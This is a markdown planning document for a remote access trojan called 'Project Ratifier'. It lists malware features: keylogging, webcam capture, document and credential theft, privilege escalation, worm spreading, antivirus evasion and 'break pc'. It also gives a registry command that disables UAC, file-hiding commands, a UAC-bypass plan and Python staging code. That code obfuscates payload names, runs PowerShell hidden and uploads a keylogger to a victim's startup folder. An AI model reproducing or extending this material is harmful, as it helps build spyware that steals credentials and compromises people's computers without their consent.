# Project Ratifier
> JOKER | 27-10-25
---

 /$$$$$$$              /$$     /$$  /$$$$$$  /$$                    
| $$__  $$            | $$    |__/ /$$__  $$|__/                    
| $$  \ $$  /$$$$$$  /$$$$$$   /$$| $$  \__/ /$$  /$$$$$$   /$$$$$$ 
| $$$$$$$/ |____  $$|_  $$_/  | $$| $$$$    | $$ /$$__  $$ /$$__  $$
| $$__  $$  /$$$$$$$  | $$    | $$| $$_/    | $$| $$$$$$$$| $$  \__/
| $$  \ $$ /$$__  $$  | $$ /$$| $$| $$      | $$| $$_____/| $$      
| $$  | $$|  $$$$$$$  |  $$$$/| $$| $$      | $$|  $$$$$$$| $$      
|__/  |__/ \_______/   \___/  |__/|__/      |__/ \_______/|__/

---

## Overview:
We are developing Remote Access Tool [RAT]. We can use this to command and control [C2] target computer.

## Resources:
- YT URL: https://www.youtube.com/playlist?list=PL_dk67mLCSFHa5jDNvEuXuoafMHmTjn32

```
# show files
attrib -h -s -r FILE

# hide file
attrib +h +s +r FILE

# disable uac
Set-ItemProperty -Path
REGISTRY::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin -Value 0

```

## Components:
- keylogger
    - backspace detection
- screenshots
- webcam
- exfiltration
    - stealing documents
- remote Access
- credentials
    - web
    - computer
    - applications
    - wi-fi
- advanced reconnaissance
    - contact information
- privesc
- worm
- killswitch
- break pc
- generate in console payloads
- custom uploads

## Roadmap:
- initial staging
- develop keylogger
- screenshots
- webcam
- obtaining credential
- obfuscation
    - av, vm detection
    - disabling firewall, ad


# keylogger code
'''
def keylogger(address, password, working_directory, startup_directory):
    controller = f"{local_path}/payloads/controller.cmd"
    keylogger = f"{local_path}/payloads/keylogger.ps1"
    scheduler = f"{local_path}/payloads/scheduler.ps1"

    # obsfuscated files
    obsfuscated_controller = random_text + ".cmd"
    obsfuscated_keylogger = random_text + ".ps1"
    obsfuscated_scheduler = random_text + ".ps1"

    # building controller
    with open(obsfuscated_controller, "w") as f:
        f.write("@echo off")
        f.write(f"powershell powershell.exe -Windowstyle hidden \"{working_directory}\"")

    # file stagging
    os.system(f"cp {controller} {local_path}/{obsfuscated_controller}")
    os.system(f"cp {keylogger} {local_path}/{obsfuscated_keylogger}")
    os.system(f"cp {scheduler} {local_path}/{obsfuscated_scheduler}")

    # remote upload
    remote_upload(address, password, obsfuscated_controller, startup_directory) # controller
    remote_upload(address, password, obsfuscated_keylogger, working_directory) # keylogger
    remote_upload(address, password, obsfuscated_scheduler, working_directory) # scheduler
'''

## Stages:
1. initial payload creates files in startup directory
    - cmd to run administrative commands
        - set exec bypass
    - vbs file to hold 'alt' + 'y' for UAC bypass
    - self delete
2. new malware initializes remote connection
    - any additional tools can be installed remotely
    - keeps a low profile on the payload
3. modularity
    - having a directory to store resources for the RAT

## Extraneous:
- bsod
- user activity
- web history
